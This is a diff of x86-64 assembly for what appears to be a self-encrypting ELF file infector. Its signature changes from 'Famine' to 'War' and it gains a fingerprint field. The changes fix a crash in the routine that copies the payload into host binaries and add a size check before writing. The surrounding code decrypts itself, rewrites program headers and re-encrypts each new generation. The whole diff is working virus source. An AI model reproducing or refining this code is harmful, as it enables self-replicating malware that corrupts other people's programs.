@@ -13,7 +13,9 @@ key:
 	lea rsi, [rel encryption_start]
 	lea rdx, [rel encryption_end]
 	sub rdx, rsi
+	push rdi
 	call decryptor
+	pop rdi
 	jmp main
 
 decryptor:	;rdi:key  rsi:addr rdx:size
@@ -471,11 +473,15 @@ rewrite_binary:
 	mov rbx, QWORD[rax + phdr.p_filesz]
 	mov QWORD[rax + phdr.p_memsz], rbx			;dataphdr.p_memsz = p_filesz
 
+	mov rax, QWORD[r11 + elf_struc.new_code_offset]
+	cmp rax, QWORD[r11 + elf_struc.stat + stat.st_size]
+	jg ret_0									;check if payload can be wrote
+
 	mov r13, 0									;bits written
 	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
 	mov rsi, QWORD[r11 + elf_struc.ptr]
 	mov rdx, QWORD[r11 + elf_struc.new_code_offset]
-	call memcpy											;copie du debut du bin      SEGV ici !!!
+	call memcpy											;copie du debut du bin
 	add r13, QWORD[r11 + elf_struc.new_code_offset]
 
 	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
@@ -510,7 +516,6 @@ rewrite_binary:
 	push r11
 	call encrypt_new_gen
 	pop r11
-
 
 	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
 	add rdi, r13
@@ -977,5 +982,7 @@ bss_name:
 	db '.bss', 0
 encryption_end:
 signature:
-	db 'Famine version 1.0 (c)oded by gdelabro', 0
+	db 'War version 1.0 (c)oded by gdelabro - '
+fingerprint:
+	db '00000000', 0
 end:
